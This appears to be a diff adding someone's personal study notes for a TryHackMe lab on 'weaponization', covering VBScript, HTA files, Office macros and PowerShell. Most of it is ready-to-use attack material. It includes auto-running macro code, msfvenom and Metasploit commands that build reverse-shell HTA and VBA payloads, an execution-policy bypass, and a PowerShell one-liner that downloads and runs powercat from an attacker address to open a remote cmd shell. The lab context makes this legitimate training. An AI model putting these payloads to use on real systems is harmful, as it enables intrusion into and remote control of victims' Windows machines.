@@ -1,0 +1,84 @@
+### windows scripting host ###
+## links
+https://tryhackme.com/room/weaponization
+
+
+
+## example
+# hello.vbs
+Dim message 
+message = "Welcome to THM"
+MsgBox message
+
+> wscript hello.vbs
+> cscript hello.vbs
+
+Set shell = WScript.CreateObject("Wscript.Shell")
+shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+> wscript /e:VBScript c:\Users\toto\Desktop\hello.vbs
+
+
+
+## HTA
+# app.hta
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+
+# expose then open http://10.8.98.114/app.hta on wanted to pwn machine
+python3 -m http.server 80
+# or
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.98.114 LPORT=443 -f hta-psh -o app.hta
+# or
+msfconsole
+use exploit/windows/misc/hta_server
+set LHOST 10.8.98.114
+set LPORT 443
+set SRVHOST 10.8.98.114
+set payload windows/meterpreter/reverse_tcp
+exploit
+
+ 
+
+## VBA macro
+Sub Document_Open()
+  THM
+End Sub
+
+Sub AutoOpen()
+  THM
+End Sub
+
+Sub THM()
+	Dim payload As String
+	payload = "calc.exe"
+	CreateObject("Wscript.Shell").Run payload,0
+End Sub
+
+# save as .doc
+# or msfvenom and change Workbook_Open() to Document_Open()
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.98.114 LPORT=443 -f vba
+
+
+
+## pwershell
+# exec
+> powershell -ex bypass -File file.ps1
+# rshell
+cd /home/tristan/perso/secu/win/weaponization && python3 -m http.server 80
+nc -nlvp 1337
+> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.98.114/powercat.ps1'); powercat -c 10.8.98.114 -p 1337 -e cmd"
+
+
+
+
+
+
+
+
+
